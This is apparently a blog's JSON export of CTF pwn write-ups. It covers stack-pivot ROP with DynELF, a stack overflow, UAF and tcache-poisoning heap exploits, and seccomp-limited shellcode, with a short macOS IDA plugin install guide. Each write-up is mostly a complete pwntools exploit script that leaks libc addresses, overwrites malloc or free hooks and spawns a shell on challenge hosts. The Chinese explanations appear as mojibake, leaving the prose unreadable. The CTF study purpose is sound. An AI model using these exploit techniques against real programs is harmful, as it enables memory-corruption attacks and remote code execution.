p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0) payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+0x500-8*3)+\"/bin/sh\\x00\" s.sendafter(\"canary ' s 5 0 n g :\",payload) payload = p64(canary)*6+p64(bss+0x100-8) s.sendafter(\"canary ' s h 0 m e :\",payload) s.recvline() æ¥ç€å°±æ˜¯ç”¨è¿™å†™å¥½å¥½çš„rop chainï¼Œè¿›è¡Œæ³„æ¼åœ°å€ï¼Œä¸ºäº†Dynelfå¤šæ¬¡è°ƒç”¨æ³„æ¼ï¼Œåœ¨æ³„æ¼åœ°å€åï¼Œè·Ÿä¸Šreadå‡½æ•°ç»§ç»­å¾€è¿™æ®µåœ°å€ä¸Šè¯»å–åŒæ ·çš„rop chainï¼Œç„¶åå†æ¬¡æ§åˆ¶rspï¼Œæ¥ç€retåˆ°å¯¹åº”çš„ä½ç½®ï¼š def vuln(address): payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(0) payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0) + \\ p64(read_plt)+p64(pop_rsp_3)+p64(0x6015a0-8*3) s.recvline(timeout=0.07) s.send(payload) count = 0 up = \"\" buf = '' while True: c = s.recv(numb=1, timeout=0.07) count += 1 if up == '\\n' and c == \"\": buf = buf[:-1] buf += \"\\x00\" break else: buf += c up = c data = buf[:8] log.debug(\"%#x =&gt; %s\" % (address, (data or '').encode('hex'))) return data å¯ä»¥çœ‹åˆ°æ˜¯æé«˜äº†0x500ä¸ªå­—èŠ‚çš„åœ°æ–¹è¿›è¡Œropï¼Œåšå¥½ç”¨æ§åˆ¶rspï¼Œretåè¿›è¡Œåå¤æ¨ªè·³è·ƒï¼Œå®Œæˆå¯¹system çš„å¯»æ‰¾ã€‚æ„Ÿè§‰è¿™æ˜¯å¾ˆå¥½çš„åŠæ³•ï¼Œå› ä¸ºæ ˆè¿ç§»çš„æ ¸å¿ƒè¿˜æ˜¯æ§åˆ¶rspï¼Œæœ€åˆå­¦ä¹ æ˜¯è§è¿‡2æ¬¡æ ˆè¿ç§»çš„é¢˜ç›®ï¼Œå½“æ—¶ç”¨çš„è¿˜æ˜¯leave ret æ¥è¿›è¡Œçš„æ§åˆ¶ï¼Œç°åœ¨çœ‹åˆ°ç›´æ¥ä½¿ç”¨pop rsp æ¥æ§åˆ¶ï¼Œçš„ç¡®æ˜¯æ–¹ä¾¿åˆç®€å•çš„åŠæ³•ã€‚ expfrom pwn import * # from LibcSearcher import * s = process(\"./pwn\") # s = remote(\"183.129.189.61\",54900) libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\") elf = ELF(\"./pwn\") context.log_level='debug' def debug(): # gdb.attach(proc.pidof(s)[0],gdbscript='b main') gdb.attach(s) pause() pop_rdi = 0x0000000000400963 pop_rsi_r15 = 0x0000000000400961 pop_rsp_3 = 0x000000000040095d leave_ret = 0x00000000004007dc context.terminal = ['tmux','neww'] puts_plt = elf.plt['puts'] puts_got = elf.got['puts'] read_plt = elf.plt['read'] bss = 0x6010a0 s.sendafter(\"canary ' s @ # $ % ^ &amp; * :\\n\", \"%9$p\") canary = int(s.recvline(keepends=False), 16) success(hex(canary)) context.arch = 'amd64' def vuln(address): payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(0) payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0) + \\ p64(read_plt)+p64(pop_rsp_3)+p64(0x6015a0-8*3) s.recvline(timeout=0.07) s.send(payload) count = 0 up = \"\" buf = '' while True: c = s.recv(numb=1, timeout=0.07) count += 1 if up == '\\n' and c == \"\": buf = buf[:-1] buf += \"\\x00\" break else: buf += c up = c data = buf[:8] log.debug(\"%#x =&gt; %s\" % (address, (data or '').encode('hex'))) return data debug() payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0) payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+0x500-8*3)+\"/bin/sh\\x00\" s.sendafter(\"canary ' s 5 0 n g :\",payload) payload = p64(canary)*6+p64(bss+0x100-8) s.sendafter(\"canary ' s h 0 m e :\",payload) s.recvline() puts = u64(s.recv(6).ljust(8,'\\x00')) success(hex(puts)) s.recvline() d = DynELF(vuln,elf=elf) system = d.lookup('system','libc') success(hex(system)) payload = p64(pop_rdi)+p64(0x6010a0+0x100+8*11)+p64(system) s.send(payload) s.interactive()","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"},{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"IOT","slug":"IOT","permalink":"http://chumen77.xyz/tags/IOT/"}]},{"title":"MacOSå®‰è£…IDAæ’ä»¶keypatch","slug":"MacOSå®‰è£…IDAæ’ä»¶keypatch","date":"2020-08-10T09:23:15.104Z","updated":"2020-08-10T15:11:27.782Z","comments":true,"path":"2020/08/10/MacOSå®‰è£…IDAæ’ä»¶keypatch/","link":"","permalink":"http://chumen77.xyz/2020/08/10/MacOSå®‰è£…IDAæ’ä»¶keypatch/","excerpt":"","text":"MacOSå®‰è£…IDAæ’ä»¶keypatchmacOS å®‰è£…å®˜æ–¹ä»‹ç»çš„å®‰è£…æ–¹å¼ä¸å¤ªè¡Œã€‚ç½‘ä¸Šå‚è€ƒåè®°å½•ä¸€ä¸‹ã€‚ cmakebrew install cmake gitgit clone https://github.com/fjh658/keystone-engine.git cd keystone-engine git submodule update --init --recursive sudo python2 setup.py install --verbose æ­¤æ—¶åœ¨å®‰è£…åçš„æœ€åå‡ æ®µä»£ç ä¸­ï¼Œæ‰¾åˆ°ç±»ä¼¼ï¼š /Library/Python/2.7/site-packages/keystone è¿™æ˜¯æœ¬åœ°python2.7çš„è·¯å¾„ã€‚ cpcp -r /Library/Python/2.7/site-packages/keystone /Applications/IDA\\ Pro\\ 7.0/ida.app/Contents/MacOS/python/lib/python2.7/lib-dynload/ sudo curl -L https://raw.githubusercontent.com/keystone-engine/keypatch/master/keypatch.py &gt; keypatch.py ç°å®æ‹’ç»çš„è¯ï¼Œå¯ä»¥ vim /etc/hosts 199.232.68.133 raw.githubusercontent.com cp -r ./keypatch.py /Applications/IDA\\ Pro\\ 7.0/ida64.app/Contents/MacOS/plugins/ cp -r ./keypatch.py /Applications/IDA\\ Pro\\ 7.0/ida.app/Contents/MacOS/plugins/ ç„¶åè¿›å…¥idaä½¿ç”¨å³å¯ã€‚","categories":[],"tags":[{"name":"æ‚é¡¹","slug":"æ‚é¡¹","permalink":"http://chumen77.xyz/tags/æ‚é¡¹/"}]},{"title":"DASCTFå®‰æ’æœˆèµ›(7th)","slug":"DASCTFå®‰æ’æœˆèµ›(7th)","date":"2020-07-25T13:50:36.163Z","updated":"2020-08-10T03:50:16.610Z","comments":true,"path":"2020/07/25/DASCTFå®‰æ’æœˆèµ›(7th)/","link":"","permalink":"http://chumen77.xyz/2020/07/25/DASCTFå®‰æ’æœˆèµ›(7th)/","excerpt":"","text":"DASCTFå®‰æ’æœˆèµ›(7th)åªåšå‡ºä¸ªç­¾åˆ°é¢˜ï¼Œtclã€‚ã€‚ã€‚ è™šå‡çš„ç­¾åˆ°é¢˜ç®€å•çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯å‡ºé¢˜äººä¼°è®¡æ˜¯ç”¨äº†GCC&gt;=4.9ç‰ˆæœ¬ï¼Œæ•…æ„ç»™è¿™ä¸ªStack Buffer Overflow è®¾ç½®éš¾åº¦ã€‚ åˆ†æ0x80485fd &lt;main+104&gt;: mov ecx,DWORD PTR [ebp-0x4] 0x8048600 &lt;main+107&gt;: leave 0x8048601 &lt;main+108&gt;: lea esp,[ecx-0x4] 0x8048604 &lt;main+111&gt;: ret è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºåœ¨å¯¹æ ˆçš„ä¿å­˜ä¸Šï¼Œé¢å¤–ä½¿ç”¨äº† ecx æ¥ä¿å­˜æ ˆä¸Šçš„æŸä¸ªå€¼ã€‚å¹¶ä¸”è°ƒè¯•å¯ä»¥å‘ç°ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥overflowäº† espï¼Œé‚£ä¹ˆä¼šé€ æˆå¥‡æ€ªçš„å½±å“ã€‚ è¯•ç€åˆ†æä¸€ä¸‹ï¼š æƒ³è¦æ§åˆ¶espï¼Œå°±å¾—æ§åˆ¶ecx æƒ³è¦æ§åˆ¶ecxï¼Œå°±å¾—è‡³å°‘æ§åˆ¶åˆ°ebp-0x4çš„ä½ç½® ç”±äºæ˜¯getsçš„è·å–è¾“å…¥ï¼Œè¿™ä¸ªæ˜æ˜¾å¾ˆå®¹æ˜“å®ç°ã€‚ æ ¸å¿ƒå°±æ˜¯è®©ï¼š [ [ebp-0x4] - 0x4] = address(backdoor) é™„ä¸ŠæˆåŠŸæ—¶æ ˆæƒ…å†µ,æ–­ç‚¹åœ¨0x80485fd ï¼š ç”±äºæ ˆéšæœºåŒ–ï¼Œå…¶ä¸­éœ€è¦ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„æ¼[ebp-0x4]ï¼Œæ¥è·å–åœ¨ebp-0x4çš„ä½ç½®å¡«å…¥ä»€ä¹ˆå€¼åˆé€‚ï¼Œä»è€Œå®Œæˆæ”»å‡»ã€‚ expfrom pwn import * import time local_file = './qiandao' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('183.129.189.60',10013) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() one = 0x804857D # debug() payload = '%13$p' sla('name',payload) ru('0x') key = int(r(8),16) - 0x40 + 0x8 info_addr('key',key) payload = p32(one)*9 + p32(key) sla(\"?\",payload) itr() å¤šè°ƒè¯•ï¼Œä¼šæ›´å®¹æ˜“ç†è§£ã€‚","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"BUUCTFæš‘å‡åˆ·é¢˜(1)","slug":"BUUCTFæš‘å‡åˆ·é¢˜","date":"2020-07-10T13:16:13.644Z","updated":"2020-10-10T12:21:34.242Z","comments":true,"path":"2020/07/10/BUUCTFæš‘å‡åˆ·é¢˜/","link":"","permalink":"http://chumen77.xyz/2020/07/10/BUUCTFæš‘å‡åˆ·é¢˜/","excerpt":"","text":"BUUCTFæš‘å‡åˆ·é¢˜(1)cmcc_simpleropåˆ†æé™æ€é“¾æ¥ã€‚32ä½ç¨‹åºã€‚ç”¨int 80h è¿™ä¸ªä¸­æ–­è°ƒç”¨ï¼Œå‘¼å«ç³»ç»Ÿè°ƒç”¨ç¨‹åºsystem_call().ã€‚ ç„¶årop æ§åˆ¶EAX = 0Xb = 11ï¼ŒEBX = &amp;(â€œ/bin/shâ€), ECX = EDX = 0ï¼Œå³æ‰§è¡Œäº†sys_execve(&quot;/bin/sh&quot;, 0, 0, 0)ï¼Œå³å¯æ‹¿åˆ°shellã€‚ 32ä½ç³»ç»Ÿè°ƒç”¨è¡¨ï¼šhttps://blog.csdn.net/xiaominthere/article/details/17287965 expfrom pwn import * import time local_file = './simplerop' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # '../libc.so.6 context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',29124) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww'] rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() offset = 32 start = 0x8048E45 read = 0x806CD50 pop_eax_ret = 0x080bae06 pop_ebx_ret = 0x080481c9 pop_ecx_ebx_ret = 0x0806e851 pop_edx_ret = 0x0806e82a pop3_ret = 0x08048913 bss = 0x80EC2EC - 0x10 ret = 0x8048E6F in_t_0x80 = 0x080493e1 payload = 'a' * offset + flat([read,pop3_ret,0,bss,0x8]) payload += flat([pop_eax_ret,11,pop_ecx_ebx_ret,0,bss,pop_edx_ret,0,in_t_0x80]) sa(':',payload) s('/bin/sh\\x00') itr() å…¶ä¸­ropé“¾readåè¿”å›åœ°å€ï¼špop3_retï¼Œæ˜¯ä¸ºäº†pop 0,bss,0x8ï¼Œç„¶åå†è·Ÿç€ropã€‚ ciscn_2019_n_3åˆ†æUbuntu 18 ,å­˜åœ¨UAFæ¼æ´ã€‚ int __cdecl rec_str_free(void *ptr) &#123; free(*((void **)ptr + 2)); free(ptr); return puts(\"Note freed!\"); &#125; æ¯åˆ›å»ºä¸€ä¸ªå †ï¼Œå°±æœ‰ä¸€ä¸ª0x10çš„å †ç©ºé—´ï¼Œå­˜æ”¾å‡½æ•°æŒ‡é’ˆã€‚ä¸€çœ‹åˆ°è¿™ä¸ªï¼Œå°±å¯ä»¥è¯´æ˜¯æš—ç¤ºæ”»å‡»è¿™ä¸ªåœ°æ–¹æ¥åŠ«æŒç¨‹åºæµç¨‹ã€‚ int do_del() &#123; int v0; // eax v0 = ask((int)\"Index\"); return (*(int (__cdecl **)(int))(records[v0] + 4))(records[v0]); &#125; åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥åŠ«æŒç¨‹åºæµç¨‹ã€‚å…ˆnew(0,2,0x40,payload)çœ‹ä¸€ä¸‹ç¨‹åºçš„å†…å­˜æƒ…å†µ, å¯¹äºå…¶ä¸­çš„(*(int (__cdecl **)(int))(records[v0] + 4))(records[v0]) ï¼š gefâ¤ p &amp;records $1 = (&lt;data variable, no debug info&gt; *) 0x804b080 &lt;records&gt; gefâ¤ x/wx 0x804b080 0x804b080 &lt;records&gt;: 0x08635160 gefâ¤ x/wx 0x08635160 0x8635160: 0x080486de æ‰€ä»¥ records[v0] = 0x08635160 gefâ¤ x/wx 0x08635160+4 0x8635164: 0x08048725 gefâ¤ x/i 0x08048725 0x8048725 &lt;rec_str_free&gt;: push ebp æ‰€ä»¥ *(int (__cdecl **)(int))(records[v0] + 4)) = 0x8048725 &lt;rec_str_free&gt;: ä¸”å¦‚å›¾ï¼ŒæŠŠè¿™é‡Œçš„å‡½æ•°æŒ‡é’ˆæ§åˆ¶æˆsh\\x00\\00 + &amp;system ,å³æ‰§è¡Œdo_delæ—¶ï¼Œè¿è¡Œçš„å°±æ˜¯system(sh)å¯æ‹¿åˆ°shellã€‚ expfrom pwn import * import time local_file = './ciscn_2019_n_3' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # '../libc.so.6 context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',26453) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww'] rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def new(id,type,len,context): sla(\"CNote &gt;\",'1') sla(\"dex &gt;\",str(id)) sla(\"Type &gt;\",str(type)) sla(\"th &gt;\",str(len)) sa(\"ue &gt;\",str(context)) def free(id): sla(\"CNote &gt;\",'2') sla(\"dex &gt;\",str(id)) def show(id): sla(\"CNote &gt;\",'3') sla(\"dex &gt;\",str(id)) payload = \"a\" + '\\n' new(0,2,0x40,payload) new(1,2,0x40,payload) free(1) free(0) system = elf.plt['system'] new(2,2,0x9,'sh\\x00\\x00'+ p32(system)) free(1) itr() æ— systemå‡½æ•°æƒ…å†µä¸‹Leak libcï¼Œè¿˜æ˜¯æ”»å‡»é‚£ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œæœ¬åœ°é€šè¿œç¨‹æ²¡é€šã€‚ åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œç”±äºfgetsæ€»æ˜¯åœ¨ä½ ä¼ å…¥çš„å­—ç¬¦ä¸²ååŠ ä¸Š\\x00ï¼Œæ›¾ç»å°±é‡åˆ°è¿‡ï¼Œå¯¼è‡´æ³„æ¼ååˆ†éš¾è¿›è¡Œï¼Œä½†æ˜¯å‘ç°ï¼š payload = '' new(2,2,0x0,payload) ru(\"lue=\") libc_base = uu32(r(4)) - 0x1d89d8 ä¼ å…¥ç©ºå­—èŠ‚ç«Ÿç„¶å¯ä»¥é€šè¿‡ï¼Œä¸”æ²¡æœ‰åŠ ä¸Š\\x00ï¼Œä»è€Œä¸å½±å“æ³„æ¼libcã€‚è¿˜ä¸çŸ¥é“æ˜¯å¦ä»¥åé‡åˆ°fgetså‡½æ•°å°±å¯ä»¥è¿™æ ·å¤„ç†å…¶å½±å“ï¼Œå…ˆæŒ–ä¸ªå‘ï¼Œè®°å½•ç€ã€‚ payload = 'a' + '\\n' new(0,2,0x400,payload) new(1,2,0x400,payload) free(0) payload = '' new(2,2,0x0,payload) ru(\"lue=\") libc_base = uu32(r(4)) - 0x1d89d8 info_addr(\"libc_base\",libc_base) payload = '\\x00'*4 + '/bin/sh\\x00' +'\\n' new(3,2,0x400-0x10-0x10,payload) new(4,2,0x40,payload) new(5,2,0x40,payload) free(5) free(4) rec = libc_base + 0x3d123 new(6,2,0x9,p32(rec) + p32(rec)) # free(5) show(5) # debug() itr() V&amp;N2020easyTHeapåˆ†æUbuntu 18 ,å­˜åœ¨UAFæ¼æ´ï¼Œtcache dupæ”»å‡»ã€‚ è€ƒç‚¹ï¼š æ”»å‡»tcache_perthread_structï¼Œä¼ªé€ tcacheå·²ç»æ»¡äº† æ”»å‡»tcache_entryï¼Œåœ¨æŒ‡å®šçš„ä½ç½®å†™ä¸Šç›®æ ‡åœ°å€ï¼Œåœ¨ç”³è¯·ä¸€ä¸ªå¯¹åº”å¤§å°çš„å †ï¼Œå³å¯å®ç°ä»»æ„åœ°å€å†™å…¥ã€‚exp from pwn import * import time local_file = './vn_pwn_easyTHeap' local_libc = '/lib/x86_64-linux-gnu/libc-2.27.so' remote_libc = './libc-2.27.so' context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',25814) libc = ELF(remote_libc) elf = ELF(local_file) # libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww'] rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size): sla(\"choice\",'1') sla(\"?\",str(size)) def edit(idx,context): sla(\"choice\",'2') sla('idx',str(idx)) sa('content',str(context)) def show(idx): sla('choice','3') sla('idx',str(idx)) def free(idx): sla('choice','4') sla(\"idx\",str(idx)) add(0x100) #0 add(0x100) #1 free(0) free(0) show(0) r() heapbase = uu64(r(6)) - 0x260 info_addr('heapbase',heapbase) add(0x100) #2 edit(2,p64(heapbase+0x10)) add(0x100) #3 add(0x100) #4 edit(4,'\\x07'*0x10) free(0) show(0) r() libc_base = uu64(r(6)) - 0x3ebca0 info_addr('libc_base',libc_base) __malloc_hook = libc_base + 0x3ebc30 __realloc_hook = __malloc_hook -0x8 payload = '\\x00' * (8+7) + '\\x01' + '\\x00' * (0x80 - 8 - 8) + '\\x00' * 0x38 + p64(__realloc_hook) edit(4,payload) add(0x100) #5 onerec = 0x10a38c + libc_base realloc_addr = libc_base + libc.symbols['__libc_realloc'] info_addr('relloc',realloc_addr) info_addr('__malloc_hook',__malloc_hook) payload = p64(onerec) + p64(realloc_addr+8) edit(5,payload) add(0x100) #debug() itr() ciscn_2019_final_3åˆ†æUbuntu 18ï¼Œä¿æŠ¤å…¨å¼€ï¼Œå­˜åœ¨uafæ¼æ´ã€‚ ç¨‹åºåªæœ‰å¢åŠ å’Œåˆ é™¤çš„åŠŸèƒ½ï¼Œä½†æ˜¯å¢åŠ ä¸€ä¸ªå †å—åå›ç»™ä½ è¿”å›ç”³è¯·å †å—çš„åœ°å€ä¿¡æ¯ã€‚ printf(\"gift :%p\\n\", heaplist[HIDWORD(size)]); åˆ é™¤å †åï¼Œæ²¡æœ‰ç½®0çš„æ“ä½œï¼Œå­˜åœ¨uafã€‚ è€ƒç‚¹ï¼š æ”»å‡»tcache_perthread_structï¼Œä¼ªé€ tcacheå·²ç»æ»¡äº† æ”»å‡»tcache_entryï¼Œåœ¨æŒ‡å®šçš„ä½ç½®å†™ä¸Šç›®æ ‡åœ°å€ï¼Œåœ¨ç”³è¯·ä¸€ä¸ªå¯¹åº”å¤§å°çš„å †ï¼Œå³å¯å®ç°ä»»æ„åœ°å€å†™å…¥ã€‚ éš¾ç‚¹ï¼š æ³„æ¼libcåœ°å€ ç²¾å·§çš„æ„é€ ä¸€ä¸ªä»»æ„åœ°å€å†™ï¼ˆåœ¨tcache structå¤„æŠ˜è…¾ï¼‰ expfrom pwn import * import time local_file = './ciscn_final_3' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',27714) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size,content): sla(\"&gt;\",'1') sla('index',str(idx)) sla('size',str(size)) sa('thing',str(content)) ru(\"0x\") gift = int(r(12),16) info_addr('gift',gift) return gift def free(idx): sla(\"&gt;\",'2') sla(\"index\",str(idx)) heap_base = add(0,0x48,'a') - 0x11e70 free(0) free(0) add(1,0x48,p64(heap_base+0x10)) add(2,0x48,p64(heap_base+0x10)) payload = 0x30 * '\\x07' add(3,0x48,payload) free(3) payload = 0x30 * '\\x00' add(4,0x48,payload) add(5,0x10,' ') libc_base = add(6,0x78,' ') - 0x3ebca0 info_addr('libc_base',libc_base) free_hook = libc_base + 0x3ed8e8 free(5) add(7,0x10,p64(free_hook)*2) one_rec = 0x4f322 + libc_base add(8,0x48,p64(one_rec)) # debug() free(4) itr() è°ƒè¯•ä¸€ä¸‹å°±æ‡‚äº†ã€‚å…¶ä¸­0x10é‚£ä¸ªå †å—çš„ç”³è¯·å¾ˆé‡è¦ï¼Œæ­£å¥½å¯ä»¥ä¾›åé¢çš„ä½¿ç”¨ã€‚ picoctf_2018_rop chainåˆ†æåªæ˜¯ä¸€ä¸ªç®€å•çš„ropï¼Œè€ƒçš„å°±æ˜¯32ä½ä¸‹å¦‚ä½•æ§åˆ¶ä¼ å‚æ•°ã€‚ expfrom pwn import * import time local_file = './PicoCTF_2018_rop_chain' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',29550) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() win_function1 = 0x080485CB win_function2 = 0x80485D8 flag = 0x0804862B offset = 0x18 + 4 ru('Enter your input&gt;') payload = 'a' * offset + flat([win_function1,win_function2,flag,0xBAAAAAAD,0xDEADBAAD]) # debug() s(payload + '\\n') itr() pwnable_orwåˆ†æè€ƒç‚¹ ï¼š ç®€å•shellcode çš„ç¼–å†™ seccompï¼ˆæŒ–å‘ï¼‰ https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/ å…ˆç”¨seccomp-toolsçœ‹ä¸‹ç¦ç”¨äº†ä»€ä¹ˆå‡½æ•°ï¼š âœ pwnable_orw seccomp-tools dump ./orw line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x09 0x40000003 if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x15 0x07 0x00 0x000000ad if (A == rt_sigreturn) goto 0011 0004: 0x15 0x06 0x00 0x00000077 if (A == sigreturn) goto 0011 0005: 0x15 0x05 0x00 0x000000fc if (A == exit_group) goto 0011 0006: 0x15 0x04 0x00 0x00000001 if (A == exit) goto 0011 0007: 0x15 0x03 0x00 0x00000005 if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x00000003 if (A == read) goto 0011 0009: 0x15 0x01 0x00 0x00000004 if (A == write) goto 0011 0010: 0x06 0x00 0x00 0x00050026 return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW æ˜æ˜¾åªèƒ½æ‰§è¡Œ open read wirte å‡½æ•°ã€‚ #è¿™é‡Œå¯ä»¥ç”¨pwntoolsåº“çš„ä¸€ä¸ªå‡½æ•°ä»£æ›¿,shellcraft cè¯­è¨€:open(\"/home/orw/flag\") &lt;==&gt; æ±‡ç¼–:asm(shellcraft.open(\"/home/orw/flag\")) cè¯­è¨€:read(3,buf,0x20)&lt;==&gt; æ±‡ç¼–:asm(shellcraft.read(3,\"esp\",0x20) cè¯­è¨€:write(1,buf,0x20)&lt;==&gt;æ±‡ç¼–:asm(shellcraft.write(1,\"esp\",0x20)) å…¶ä¸­ å°±æ˜¯ä»¥espå½“åšä¸´æ—¶å˜é‡ bufçš„åœ°å€ï¼Œå…¶å¯ä»¥è‡ªå®šä¹‰ã€‚ 